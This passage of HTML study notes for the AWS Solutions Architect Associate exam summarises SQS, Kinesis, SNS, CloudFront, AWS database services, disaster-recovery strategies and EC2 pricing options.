<li>Not reactive</li>
</ul>
</li>
<li>
<p><b> Simple Queuing System (SQS) </b></p>
<ul>
<li>Fully managed <b><ins> queuing service that enables you to decouple </ins> </b>and scale mircroservices, distributed systems, and serverless applications</li>
<li>Use Case: You need to queue up transaction emails to be sent</li>
<li>e.g. Signup, Reset Password</li>
<li>Default retention <ins>4 Days and Max of 14 days</ins></li>
<li>Limitation of 256 KB per message sent</li>
<li>Low Latency (&lt;10ms on publish and receive)</li>
<li>Can have <ins>duplicate messages</ins> (at least once delivery, occasionally)</li>
<li><strong><ins> Unlimited Throughput </ins></strong></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/SQS.jpg" width="45%" />
<ul>
<li>Encryption:
<ul>
<li>In-flight encryption using HTTPS API</li>
<li>At-rest encryption using KMS keys</li>
<li>Client-side encryption if the client wants to perform encryption/decryption itself</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="sqs-message-visibility-timeout"><a class="header" href="#sqs-message-visibility-timeout">SQS Message Visibility Timeout</a></h2>
<hr>
<ul>
<li><strong><ins>After a message is polled by a customer it becomes invisible to other consumers</ins></strong></li>
<li>By default the ‚Äú message visibility timeout‚Äú is 30 seconds</li>
<li>That means the message has 30 seconds to process</li>
<li>If the message is not processed in the visibility timeout, it will be processed twice</li>
<li>A consumer could call the <code>ChangeMessageVisibility</code> API to get more time</li>
<li>If the visibility timeout is high(hours) and consumer crashes, reprocessing will take time</li>
<li>If visibility <ins>timeout is too low (seconds)</ins>, we may <ins>get duplicates</ins></li>
</ul>
<h2 id="long-polling"><a class="header" href="#long-polling">Long Polling</a></h2>
<hr>
<ul>
<li>When a consumer requests messages from the queue, it can optionally ‚Äòwait‚Äô for messages to arrive if there are none in the queue - <strong> Long Polling </strong></li>
<li>Long Polling decreases the number of API calls made to SQS while increasing the latency and efficiency of the application</li>
<li>The wait time can be between 1 sec to 20 sec</li>
<li>Long Polling is preferable to Short Polling</li>
<li>Long Polling can be enabled at the queue level or at the API level using <code>WaitTimeSeconds</code></li>
</ul>
<hr>
<h2 id="streaming-and-kinesis"><a class="header" href="#streaming-and-kinesis">Streaming and Kinesis</a></h2>
<hr>
<ul>
<li>
<p><b> What is Streaming ? </b></p>
<ul>
<li>
<p>Multiple consumers can <b> react </b> to events (messages)</p>
</li>
<li>
<p>Events live in the stream for long periods of time, so complex operations can be applied</p>
</li>
<li>
<p><b><ins> Real-time </ins> </b></p>
</li>
<li>
<p><b> Amazon-Kinesis </b></p>
<ul>
<li>Amazon Kinesis is the AWS fully managed solution for collecting, processing and <ins> analyzing streaming data in the cloud </ins></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/amazon-kinesis.jpg" width="65%" />
</li>
</ul>
<h3 id="kinesis-data-streams-1"><a class="header" href="#kinesis-data-streams-1">Kinesis Data Streams</a></h3>
<ul>
<li><strong><ins> Capture,process and store data streams</ins> </strong>
<img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-streams.jpg" width="65%" />
<ul>
<li>
<p>Security:</p>
  <img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-streams-security.jpg" width="65%" />
<ul>
<li>Control access/ authorization using IAM policies</li>
<li>Encryption in flight using HTTPS endpoints</li>
<li>Encryption at rest using KMS</li>
<li>You can implement encryption/decryption of data on client-side (harder)</li>
<li>VPC endpoints available for Kinesis to access within VPC</li>
<li><ins>Monitor API calls using CLoudTrail</ins></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-data-firehose-1"><a class="header" href="#kinesis-data-firehose-1">Kinesis Data Firehose</a></h3>
<ul>
<li><strong><ins>load data streams into AWS data stores</ins></strong></li>
<li>Pay for only data that is going through Firehose</li>
<li>Supports many data formats, conversions,
transformations, compression
<img src="clouds/aws/saa-c03/images/Application-Integration/kinesis-data-firehose.jpg" width="65%" /></li>
</ul>
<h3 id="kinesis-data-streams-vs-firehose"><a class="header" href="#kinesis-data-streams-vs-firehose">Kinesis Data Streams vs Firehose</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Kinesis Data Streams</th><th>Kinesis Data Firehose</th></tr>
</thead>
<tbody>
<tr><td>- Streaming service for ingest at scale</td><td>- Load streaming data into S3 /Redshift /OpenSearch / 3rd Party /custom HTTP</td></tr>
<tr><td>write Custom code (producer/consumer)</td><td>Fully managed</td></tr>
<tr><td><strong> <i><ins>Real-time (~200 ms)</ins></i></strong></td><td><strong> <i><ins> Near real-time (buffer time min 60 sec)</ins></i></strong></td></tr>
<tr><td>Managed scaling (shard splitting / merging)</td><td>Automatic scaling</td></tr>
<tr><td>Data storage for <ins> 1 to 365 days </ins></td><td><ins>No data storage </ins></td></tr>
<tr><td>Supports replay capability</td><td>Doesn‚Äôt support Capability</td></tr>
</tbody>
</table>
</div>
<h3 id="kinesis-data-analytics"><a class="header" href="#kinesis-data-analytics">Kinesis Data Analytics</a></h3>
<ul>
<li><strong><ins>analyze data streams with SQL or Apache Flink</ins></strong></li>
</ul>
<h3 id="kinesis-video-streams"><a class="header" href="#kinesis-video-streams">Kinesis Video Streams</a></h3>
<ul>
<li><strong><ins>Capture, process and store video streams</ins></strong></li>
</ul>
</li>
</ul>
<hr>
<h2 id="pub-sub-and-sns"><a class="header" href="#pub-sub-and-sns">Pub-Sub and SNS</a></h2>
<hr>
<ul>
<li>
<h3 id="what-is-pub--sub-"><a class="header" href="#what-is-pub--sub-"><b> What is Pub / Sub ? </b></a></h3>
<ul>
<li>
<p>Publish-subscribe pattern commonly <i> <ins> implemented in <b> messaging systems. </b> </ins></i></p>
</li>
<li>
<p>In a pub/sub system the sender of messages <ins> <b> (publishers)</b> do not send their messages directly to receivers.</ins></p>
</li>
<li>
<p>They instead send their messages to an <ins> <b> event bus </b> </ins>. The <ins> event bus categorizes their messages into groups</ins>.</p>
</li>
<li>
<p>The receivers of messages <ins> <b> Subscribers </b> subscribe to these groups</ins></p>
</li>
<li>
<p>Whenever new messages appear within their subscription the messages are immediately delivered to them</p>
  <img src="clouds/aws/saa-c03/images/Application-Integration/pub-sub.jpg" width="35%" />
</li>
<li>
<p>Publisher have no knowledge of who their subscribers are</p>
</li>
<li>
<p>Subscribers do not pull for messages</p>
</li>
<li>
<p>Messages are instead <ins> automatically and immediately pushed to subscribers</ins></p>
</li>
<li>
<p>Messages and events are interchangeable terms in pub/sub</p>
</li>
<li>
<p>Use case:</p>
<ul>
<li>A real-time chat system</li>
<li>A web-hook system</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="simple-notification-service"><a class="header" href="#simple-notification-service"><b> Simple Notification Service </b></a></h3>
<ul>
<li>It is a highly available, durable, secure,  <ins> <b> fully managed pub/sub messaging service </b> </ins> that enables you to  <i> <ins> decouple</ins> microservices, distributed systems and serverless applications </i></li>
</ul>
  <img src="clouds/aws/saa-c03/images/Application-Integration/sns.jpg" width="55%" />
</li>
</ul>
<h2 id="sqs-and-sns---fan-out-pattern"><a class="header" href="#sqs-and-sns---fan-out-pattern">SQS and SNS - Fan Out Pattern</a></h2>
<hr>
<ul>
<li>Push once in SNS, receive in all SQS queues that are subscribers
<img src="clouds/aws/saa-c03/images/Application-Integration/fan-out.jpg" width="55%" /></li>
<li>Fully decoupled : no data loss</li>
<li>SNS - Message Filtering
<ul>
<li><strong><ins>JSON policy used to filter messages sent to SNS topic‚Äôs subscriptions</ins></strong></li>
<li>If a subscription doesn‚Äôt have a filter policy, it receives every message</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront-cheatsheet"><a href="#cloudfront-cheatsheet" class="header">Cloudfront-cheatsheet</a></h1>
<ul>
<li>CloudFront is a CDN (Content Distribution Network). It makes website load fast by serving cached content that is nearby</li>
<li>CloudFront distributes cached copy at <ins> Edge Locations </ins></li>
<li>Edge Locations aren‚Äôt just not read-only , you can write them eg. PUT objects</li>
<li>TTL (Time to live) defines how long until the cache expires (refreshes cache)</li>
<li>When you invalidate your cache, you are forcing it to immediately expire (refreshes cached data)</li>
<li>Refreshing the cache costs money because of transfer costs to update Edge locations</li>
<li>Origin is the address of where the original copies of your files reside eg. S3, EC2, ELB, Route53</li>
<li><b> Distribution </b> defines a collection of Edge Locations and behavior on how it should handle your cached content</li>
<li>Distributions has 2 Types :
<ul>
<li>Web Distribution (statis website content)</li>
<li>RTMP (steaming media)</li>
</ul>
</li>
<li>Origin Identity Access (OAI) is used access private S3 buckets</li>
<li>Access to <b> cached content can be protected</b> via <ins> Signed URLs or Signed Cookies </ins></li>
<li>Lambda@Edge allows you to pass each request through a Lambda to change the behavior of the response</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront-3"><a href="#cloudfront-3" class="header">CloudFront</a></h1>
<ul>
<li><a href="#cloudfront-2">CloudFront</a></li>
<li><a href="#cloudfront-core-components-2">CloudFront Core Components</a></li>
<li><a href="#cloudfront-distributions-2">CloudFront Distributions</a></li>
<li><a href="#lambdaedge-2">Lambda@Edge</a></li>
<li><a href="#cloudfront-protection-2">CloudFront Protection</a></li>
</ul>
<hr>
<h2 id="cloudfront-2"><a class="header" href="#cloudfront-2">CloudFront</a></h2>
<hr>
<ul>
<li>
<p>Content Distribution Network (CDN) creates cached copies of your website at various Edge locations around the world</p>
</li>
<li>
<p>Content Delivery Network (CDN)</p>
<ul>
<li>
<p>A CDN is a distributed network of servers which delivers web pages and content to users based on their geographical location, the origin of the webpage and a content delivery server</p>
<ul>
<li>
<p>Can be used to deliver an entire website including static, dynamic and streaming</p>
</li>
<li>
<p>216 points of presence globally</p>
</li>
<li>
<p>DDoS protection since it is a global service. Integrates with AWS Shield and AWS WAF</p>
</li>
<li>
<p>Requests for content are served from the nearest Edge Location for the best possible performance</p>
<img src="clouds/aws/saa-c03/images/CloudFront/CDN.jpg" width="77%" height="40%" />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="cloudfront-core-components-2"><a class="header" href="#cloudfront-core-components-2">CloudFront Core Components</a></h2>
<hr>
<ul>
<li>
<p><b> Origin </b></p>
<ul>
<li>The location where all of original files are located. For example an S3 Bucket, EC2 Instance, ELB or Route53</li>
</ul>
</li>
<li>
<p><b> Edge Location </b></p>
<ul>
<li>The location where web content will be cached. This is different than an AWS Region or AZ</li>
</ul>
</li>
<li>
<p><b> Distribution </b></p>
<ul>
<li>
<p>A collection of Edge locations which defines how cached content should behave</p>
<img src="clouds/aws/saa-c03/images/CloudFront/cloudfront-core-components.jpg" width="77%" height="40%" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="cloudfront-distributions-2"><a class="header" href="#cloudfront-distributions-2">CloudFront Distributions</a></h2>
<hr>
<ul>
<li>A distribution is a collection of Edge Location. You specific the Origin eg. S3, EC2, ELB, Route53</li>
<li>It replicates copies based on your Price Class</li>
<li>There are two types of Distributions
<ol>
<li>Web (for Websites)</li>
<li>RTMP (for streaming media)</li>
</ol>
</li>
<li><b> Behaviors </b>
<ul>
<li>Redirect to HTTPs, Restrict HTTP Methods, Restrict Viewer Access, Set TTLs</li>
</ul>
</li>
<li><b> Invalidations </b>
<ul>
<li>You can manually invalidate cache on specific files via Invalidations</li>
</ul>
</li>
<li><b> Error Pages </b>
<ul>
<li>You can serve up custom error pages eg 404</li>
</ul>
</li>
<li><b> Restrictions </b>
<ul>
<li>You can use Geo Restriction to blacklist or whitelist specific countries</li>
</ul>
</li>
</ul>
<hr>
<h2 id="lambdaedge-2"><a class="header" href="#lambdaedge-2">Lambda@Edge</a></h2>
<hr>
<ul>
<li>
<p>Lambda@Edge functions are used to override the behavior of request and responses</p>
</li>
<li>
<p>Lambda@Edge lets you run Lambda functions to customize the content that CloudFront delivers, executing the functions in AWS locations closer to the viewer.</p>
</li>
<li>
<p>The functions run in response to CloudFront events, without provisioning or managing servers. You can use Lambda functions to change CloudFront requests and responses at the following points:</p>
</li>
<li>
<p>The 4 Available Edge Functions</p>
<ol>
<li>Viewer Request
<ul>
<li>When CloudFront receives a request from a Viewer</li>
</ul>
</li>
<li>Origin request
<ul>
<li>Before CLoudFront forwards a request to the origin</li>
</ul>
</li>
<li>Origin response
<ul>
<li>When cloudfront receives a response from the origin</li>
</ul>
</li>
<li>Viewer response
<ul>
<li>Before CLoudFront returns the response to the viewer</li>
</ul>
</li>
</ol>
  <img src="clouds/aws/saa-c03/images/CloudFront/lambda.jpg" width="47%" />
  <img src="clouds/aws/saa-c03/images/CloudFront/Lamda@edge.jpg" width="47%" />
</li>
</ul>
<hr>
<h2 id="cloudfront-protection-2"><a class="header" href="#cloudfront-protection-2">CloudFront Protection</a></h2>
<hr>
<ul>
<li>By Default a Distribution allows everyone to have access</li>
<li>Original Identity Access (OAI)
<ul>
<li>A virtual user identity that will be used to give your CloudFront Distribution permission to fetch a private object</li>
</ul>
</li>
<li>Inorder to use Signed URLs or Signed Cookies you need to have an OAI</li>
<li><b> Signed URLs </b>
<ul>
<li>(Not the same thing as S3 Presigned URL)
<ul>
<li>A url with provides temporary access to cached objects</li>
</ul>
</li>
</ul>
</li>
<li><b> Signed Cookies </b>
<ul>
<li>A cookie which is passed along with the request to CloudFront. The advantage of using a Cookie is you want to provide access to multiple restricted files. eg. Video Streaming</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-database--1"><a href="#what-is-database--1" class="header">What is Database ?</a></h1>
<ul>
<li><a href="#what-is-database">What is Database</a></li>
<li><a href="#what-is-data-warehouse">What is Data Warehouse</a></li>
<li><a href="#what-is-a-key-value-store">What is a key value store?</a></li>
<li><a href="#what-is-a-document-database">What is a document database?</a></li>
<li><a href="#nosql-database-services">NOSQL Database Services</a>
<ul>
<li><a href="#dynamodb-2">DynamoDB</a></li>
<li><a href="#documentdb">DocumentDB</a></li>
<li><a href="#amazon-keyspaces">Amazon Keyspaces</a></li>
</ul>
</li>
<li><a href="#relational-database-service">Relational Database Service</a></li>
<li><a href="#other-database-services">Other Database Services</a></li>
</ul>
<hr>
<h2 id="what-is-database-"><a class="header" href="#what-is-database-">What is Database ?</a></h2>
<hr>
<ul>
<li><i> A database is data-store that store semi-structured and structured data</i></li>
<li>A database is more complex stores because it requires using formal design and modeling techniques</li>
<li>Database types:
<ul>
<li><b> Relational Database </b>
<ul>
<li>Structured data represents tabular data (tables,rows and columns)</li>
</ul>
</li>
<li><b> Non-Relational Database </b>
<ul>
<li>Semi-Structured that may or may not represent tabular data</li>
</ul>
</li>
</ul>
</li>
<li>Set of functionality:
<ul>
<li>query</li>
<li>modeling strategies to optimize retrieval for different use cases</li>
<li>control over the transformation of the data into useful data structures or reports
<img src="clouds/aws/saa-c03/images/database/database.png" alt="Database"></li>
</ul>
</li>
</ul>
<hr>
<h2 id="what-is-data-warehouse-"><a class="header" href="#what-is-data-warehouse-">What is Data Warehouse ?</a></h2>
<hr>
<ul>
<li>Relational Database : designed for analytic workloads and a column-oriented data-store</li>
<li>Companies will have terabytes and millions of rows of data</li>
<li>Data warehouses generally perform <ins> aggregation</ins>
<ul>
<li>aggregation is is grouping data eg. finding a total or average</li>
<li>Data warehouses are optimised around columns since they need quickly aggregate column data</li>
</ul>
</li>
<li>Data warehouses are generally designed be HOT
<ul>
<li>HOT means they can return queries very fast even though they have vast amounts of data</li>
</ul>
</li>
<li>Data warehouses are infrequently accessed
<ul>
<li>intended for real time reporting but maybe once or twice a day or once a week to generate business or user reports</li>
</ul>
</li>
<li>Data Warehouse needs to consume data from a relational database on a regular basis</li>
</ul>
<hr>
<h2 id="what-is-a-key-value-store-"><a class="header" href="#what-is-a-key-value-store-">What is a Key Value Store ?</a></h2>
<hr>
<ul>
<li><i> A key-value database is a type of non-relational database (NoSQL) that uses a simple key-value method to store data </i>
<ul>
<li>Stores a <ins> unique key </ins>  alongside a value</li>
<li>will interpret this data resembling a dictionary</li>
<li>can resemble tabular data, it does not have to have the consistent columns per row
-Due to simple design so they can scale well beyond a relational database</li>
</ul>
</li>
</ul>
<hr>
<h2 id="what-is-a-document-database-"><a class="header" href="#what-is-a-document-database-">What is a document database ?</a></h2>
<hr>
<ul>
<li>Document store
-<i> a NOSQL database that stores documents as its primary data-structure</i>
<ul>
<li>
<p>it could be an XML but more commonly is JSON or JSON-like</p>
</li>
<li>
<p>they are sub-class of key/value stores</p>
  <img src="clouds/aws/saa-c03/images/database/document_store.png" width="55%" float="right" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nosql-database-services"><a class="header" href="#nosql-database-services">NOSQL Database Services</a></h2>
<hr>
<ul>
<li>
<h3 id="dynamodb-2"><a class="header" href="#dynamodb-2">DynamoDB</a></h3>
<ul>
<li>a serverless <ins> NOSQL key/Value and document database</ins></li>
<li>designed to scale to billions of records  with consistent data return in at <ins>least a second- millisecond latency</ins></li>
<li>It is AWS‚Äôs <ins> flagship database service  meaning it is cost-effective and very fast</ins></li>
<li><strong>DAX cluster</strong> for read cache, microsecond read latency</li>
<li>Event Processing: DynamoDB Streams to integrate with AWS Lambda, or Kinesis Data Streams</li>
<li>Global Table feature: active-active setup</li>
<li>Automated backups up to 35 days with PITR (restore to new table), or on-demand backups</li>
<li>Export to S3 without using RCU within the PITR window, import from S3 without using WCU</li>
<li>Great to rapidly evolve schema</li>
<li>It is a <ins>massively scalable database </ins></li>
<li><strong>Usecases:</strong> Serverless applications development (small documents 100s Kb), distributed serverless cache</li>
</ul>
</li>
<li>
<h3 id="documentdb"><a class="header" href="#documentdb">DocumentDB</a></h3>
<ul>
<li>A NOSQL <ins> document database </ins> that is <ins>‚ÄúMongoDB compatible‚Äù</ins></li>
<li>MongoDB is very popular NOSQL among developers there were open-source licensing issues around using open-source MongoDB , so aws got aorund it by just building their own MongoDB database</li>
<li><i> when you want a MongoDB database </i></li>
</ul>
</li>
<li>
<h3 id="amazon-keyspaces"><a class="header" href="#amazon-keyspaces">Amazon KeySpaces</a></h3>
<ul>
<li>A fully managed <ins> Apache Cassandra database </ins></li>
<li>Cassandra is an open-source NOSQL key/value database similar to DynamoDB in that is columnar store database but has some additional functionality</li>
<li><i> when you want to use Apache Casandra </i></li>
</ul>
</li>
</ul>
<hr>
<h2 id="relational-database-service"><a class="header" href="#relational-database-service">Relational Database Service</a></h2>
<hr>
<ul>
<li>
<h3 id="relational-database-services-rds"><a class="header" href="#relational-database-services-rds">Relational Database Services (RDS)</a></h3>
<ul>
<li>supports multiple SQL engines</li>
<li>Relational is synonymous with SQL and Online Transactional Processing (OLTP)</li>
<li>most commonly used type of database among tech companies and start ups</li>
<li>RDS supports the following SQL Engines:
<ul>
<li><b>MYSQL </b> - Most popular open source SQL database that was purchased and now owned by Oracle</li>
<li><b> MariaDB </b> - When Oracle bought MYSQL. MariaDB made a fork (copy) of MYSQL was made under a different open-source license</li>
<li><b> Postgres (PSQL) </b> - Most popular open-source SQL database among developers. Has rich-features over MYSQL but at added complexity</li>
<li><b> Oracle </b> - Oracle‚Äôs proprietary SQL database. Well used by Enterprise companies. Have to buy a license to use it</li>
<li><b> Microsoft SQL Server </b> - Microsoft‚Äôs proprietary SQL database. Have to buy license to use it</li>
<li><b> Aurora </b> - Fully managed database
<ul>
<li><b> Aurora </b>
<ul>
<li>fully managed database,</li>
<li>database of either <ins>MYSQL (5X faster) and PSQL (3X faster) database </ins></li>
<li><i> When you want a highly available, durable, scalable and secure relational database for Postgres or MySQL then Aurora is correct fit</i></li>
</ul>
</li>
</ul>
</li>
<li><b> Aurora Serverless </b>
- serverless on-demand version of Aurora.
- When you want ‚Äúmost‚Äù of the benefits of Aurora but can trade to have cold-starts or you don‚Äôt have lots of traffic demand</li>
<li><b> RDS on VMware </b>
- allows you to deploy RDS supported engines to on-premise data center.
- datacenter must be using VMware for server virtualization
- when you want databases managed by RDS on your own datacenter</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="other-database-services"><a class="header" href="#other-database-services">Other Database Services</a></h2>
<hr>
<ul>
<li><b> RedShift </b>
<ul>
<li><ins> petabyte-size data-warehouse </ins></li>
<li>Data warehouses
<ul>
<li>are for <ins>Online Analytical Procesing (OLAP)</ins></li>
<li>can be expensive because they are keeping data ‚Äúhot‚Äù</li>
<li>‚ÄúHOT‚Äù means we can run a very complex query and a large amount of data and get that data very fast</li>
<li>Usage: when you want to quickly generate analytics or reports from a large amount of data</li>
</ul>
</li>
</ul>
</li>
<li><b> ElasticCache </b>
<ul>
<li>a managed database of the <ins> in-memory and caching open-source databases </ins></li>
<li>Redis or Memcached</li>
<li>Usage: when you want to <ins> improve the performance of application </ins> by adding a caching layer in-front of web-server or database</li>
</ul>
</li>
<li><b> Neptune </b>
<ul>
<li>a managed <ins> graph database </ins></li>
<li>Data is represented in interconnected nodes</li>
<li>Usage: when you need to understand the connections between data eg. Mapping Fraud Rings or Social Media Relationships</li>
</ul>
</li>
<li><b> Amazon Timestreams </b>
<ul>
<li>a fully managed <ins>time series database</ins></li>
<li>Related to Devices that send lot of data that are time-sensitive such as IOT devices</li>
<li>Usage: When you need to measure how things change over time</li>
</ul>
</li>
<li><b> Amazon Quantum Ledger Database </b>
<ul>
<li>a fully managed <ins> ledger database </ins> that provides <i> transparent, immutable and cryptographically variable transaction logs </i></li>
<li>Usage: when you need to record history of financial activities that can be trusted</li>
</ul>
</li>
<li><b> Database Migration Service </b>
<ul>
<li>a database migration service</li>
<li>Can migrate from:
<ul>
<li>On-premise database to AWS</li>
<li>from two database in different or same AWS accounts using SQL engines</li>
<li>from a SQL to NOSQL database</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disaster-recovery"><a class="header" href="#disaster-recovery">Disaster Recovery</a></h1>
<ul>
<li>
<p>RPO: how much data loss are you willing to accept during a disaster</p>
</li>
<li>
<p>RTO: how much downtime can you accept</p>
</li>
<li>
<p><a href="#disaster-recover-in-aws">Disaster Recovery in AWS</a></p>
</li>
<li>
<p><a href="#database-migration-service">Database Migration Service</a></p>
<ul>
<li><a href="#continuous-replication">Continuous Replication</a></li>
<li><a href="#multi-az-deployment">Multi-AZ Deployment</a></li>
</ul>
</li>
<li>
<p><a href="#rds--aurora-mysql-migrations">RDS &amp; Aurora MySQL Migrations</a></p>
</li>
</ul>
<h2 id="disaster-recovery-in-aws"><a class="header" href="#disaster-recovery-in-aws">Disaster Recovery in AWS</a></h2>
<hr>
<ul>
<li>
<p>Any event that has a negative impact on a company‚Äôs business continuity or finances is a disaster</p>
</li>
<li>
<p>Disaster recovery (DR) is about preparing for and recovering from a disaster</p>
</li>
<li>
<p>What kind of disaster recovery?</p>
<ul>
<li>On-premise =&gt; On-Premise: traditional DR and very expensive</li>
<li>On-Premise =&gt; AWS cloud: hybrid recovery</li>
<li>AWS Cloud Region A =&gt; AWS Cloud Region B</li>
</ul>
</li>
<li>
<p>Disaster Recovery Strategies</p>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/disaster-recovery-strategies.jpg" width="50%" />
<ul>
<li>
<p>Backup and Restore</p>
<ul>
<li>
<p>High RPO</p>
</li>
<li>
<p>Cheap</p>
</li>
<li>
<p>Easy to implement</p>
<img src="clouds/aws/saa-c03/images/Disaster-Recovery/backup-restore.jpg" width="50%" />
</li>
</ul>
</li>
<li>
<p>Pilot Light</p>
<ul>
<li>small version of the app is always running in the cloud</li>
<li>Useful for the critical core components of the application (Pilot Light)</li>
<li>Very similar to Backup and Restore</li>
<li>Faster than Backup and Restore as critical systems are already up</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/pilot-light.jpg" width="50%" />
</li>
<li>
<p>Warm Standby</p>
<ul>
<li>Full system is up and running, but at minimum size</li>
<li>Upon disaster we can scale to production load</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/warm-standby.jpg" width="50%" />
</li>
<li>
<p>Hot Site/ Multi Site Approach</p>
<ul>
<li>Very low RTO (minutes or seconds) - very expensive</li>
<li>Full production scale is running AWS and On Premise</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/multi-site-hot-site.jpg" width="50%" />
</li>
</ul>
</li>
</ul>
<h2 id="database-migration-service"><a class="header" href="#database-migration-service">Database Migration Service</a></h2>
<ul>
<li>Supports heterogeneous and homogeneous migrations</li>
<li>You must create an EC2 instance to perform the replication tasks</li>
<li>Sources can be on-prem databases or EC2-based databases, Azure SQL Databases, Amazon RDS, Amazon S3, and DocumentDB</li>
<li>Targets can be on-prem databases, Amazon RDS, Redshift, DynamoDB, OpenSearch, Redis, Babelfish, DocumentDB, etc.</li>
<li>AWS Schema Conversion Tool (SCT) can convert the database schema from one engine to another if you are migrating to a different database engine</li>
</ul>
<h2 id="continuous-replication"><a class="header" href="#continuous-replication">Continuous Replication</a></h2>
<img src="clouds/aws/saa-c03/images/Disaster-Recovery/continous-replication.jpg" width="50%" />
<h2 id="multi-az-deployment"><a class="header" href="#multi-az-deployment">Multi-AZ Deployment</a></h2>
<ul>
<li>When Multi-AZ Enabled, DMS provisions and maintains a synchronously stand replica in a different AZ
<ul>
<li>Advantages:
<ul>
<li>Provide Data Redundancy</li>
<li>Eliminates I/O freezes</li>
<li>Minimizes latency spikes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rds-to-aurora-migration"><a class="header" href="#rds-to-aurora-migration">RDS to Aurora Migration</a></h2>
<ul>
<li>Options:
<ul>
<li>Snapshot RDS and migrate to Aurora</li>
<li>Create an Aurora Read REplica from RDS mySQL and when the replication lag is 0, promote it as it‚Äôs own DB Cluster</li>
<li>If MySQL is external to RDS, you can backup with Percona XtraBackup and import into Aurora</li>
<li>Use DMS if both databases are up and running</li>
</ul>
</li>
</ul>
<h2 id="on-premise-strategies"><a class="header" href="#on-premise-strategies">On-premise Strategies</a></h2>
<ul>
<li>You can download Amazon Linux ISO and run on-prem hypervisors</li>
<li>Import/export VMs for on-prem to AWS</li>
<li>Use AWS Application Discovery Service to gather info about on-prem VMs and plan a migration
<ul>
<li>Track with AWS migration hub</li>
<li>Agentless Discovery
<ul>
<li>VM inventory, configuration, performance history, etc.</li>
</ul>
</li>
<li>Agent-Based Discovery
<ul>
<li>System configuration, system performance history, running processes, network connection details, etc.</li>
</ul>
</li>
<li>Use Application Migration Service (MGN) to lift-and-shift VMs to AWS</li>
</ul>
</li>
<li>AWS Database Migration Service
<ul>
<li>Migrate data across database engines</li>
<li>Migrate databases from on-prem to AWS</li>
</ul>
</li>
<li>AWS Server Migration
<ul>
<li>Incremental replication of on-prem servers to AWS</li>
<li>Converts on-prem servers to cloud-based servers</li>
</ul>
</li>
</ul>
<h2 id="aws-backup"><a class="header" href="#aws-backup">AWS Backup#</a></h2>
<ul>
<li>Fully managed</li>
<li>Centrally manage and automate backups across all AWS services</li>
<li>AWS Backup supports cross-region backups and cross-account backups</li>
<li>Backup policies are known as Backup Plans</li>
<li>Vault Lock is used to enforce a Write-Once-Read-Many policy (WORM) to ensure backups in the Vault cannot be deleted. Even the root user cannot delete backups when enabled.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disaster-recovery-cheatsheet"><a href="#disaster-recovery-cheatsheet" class="header">Disaster-recovery-cheatsheet</a></h1>
<ul>
<li>Backup
<ul>
<li>EBS Snapshots, RDS automated backups/ Snapshots etc</li>
<li>Regular pushes to S3/ S3 IA/ Glacier, Lifecycle Policy, Cross Region Replication</li>
<li>From On-Premise:Snowball or Storage Gateway</li>
</ul>
</li>
<li>High availability
<ul>
<li>Use Route 53 to migrate DNS over Region to Region</li>
<li>RDS Multi-AZ, Elastic Cache Multi-AZ, EFS, S3</li>
<li>Site to Site VPN as a recovery from Direct Connect</li>
</ul>
</li>
<li>Replication
<ul>
<li>RDS Replication (Cross Region),AWS Aurora + Global Databases</li>
<li>Database replication from on-premise to RDS</li>
<li>Storage Gateway</li>
</ul>
</li>
<li>Automation
<ul>
<li>CloudFormation / Elastic Beanstalk to re-create a whole new environment</li>
<li>Recover / Reboot Ec2 instances with CloudWatch if alarms fail</li>
<li>AWS Lambda functions for customized automatons</li>
</ul>
</li>
<li>Chaos
<ul>
<li>Netflix has a ‚Äúsimian-army‚Äù randomly terminating EC2</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="savings-plan-1"><a href="#savings-plan-1" class="header">Savings Plan</a></h1>
<ul>
<li><a href="#reserved-instances-ri">Reserved Instances (RI)</a>
<ul>
<li><a href="#term">Term</a></li>
<li><a href="#class">Class</a></li>
<li><a href="#payment-options">Payment Options</a></li>
</ul>
</li>
<li><a href="#reserved-instance-ri-attributes">Reserved Instances Attributes</a></li>
<li><a href="#regional-and-zonal-ri">Regional and Zonal RI</a></li>
<li><a href="#ri-limits">RI Limits</a></li>
<li><a href="#capacity-reservations">Capacity Reservations</a></li>
<li><a href="#standard-vs-convertible-ri">Standard vs Convertible RI</a></li>
<li><a href="#ri-marketplace">RI Marketplace</a></li>
</ul>
<h2 id="savings-plan"><a class="header" href="#savings-plan">Savings Plan</a></h2>
<ul>
<li>Get a discount based on long term usage</li>
<li>Commit to a certain amount of usage</li>
</ul>
<h2 id="spot-instances"><a class="header" href="#spot-instances">Spot Instances</a></h2>
<ul>
<li>Up to 90% discount</li>
<li>Specify a max price you are willing to pay for your instances. If you go over the price, you lose the instance</li>
<li>The MOST cost-efficient instance pricing</li>
<li>Useful for workloads that are resilient to failure (batch jobs, etc.)</li>
</ul>
<h2 id="dedicated-hosts"><a class="header" href="#dedicated-hosts">Dedicated Hosts</a></h2>
<ul>
<li>A physical server with EC2 instance capacity dedicated to your use</li>
<li>Allows you to address compliance or licensing requirements</li>
<li>The most expensive option in AWS</li>
<li>Purchasing OPtions
<ul>
<li>On-demand</li>
<li>Reserved Instances</li>
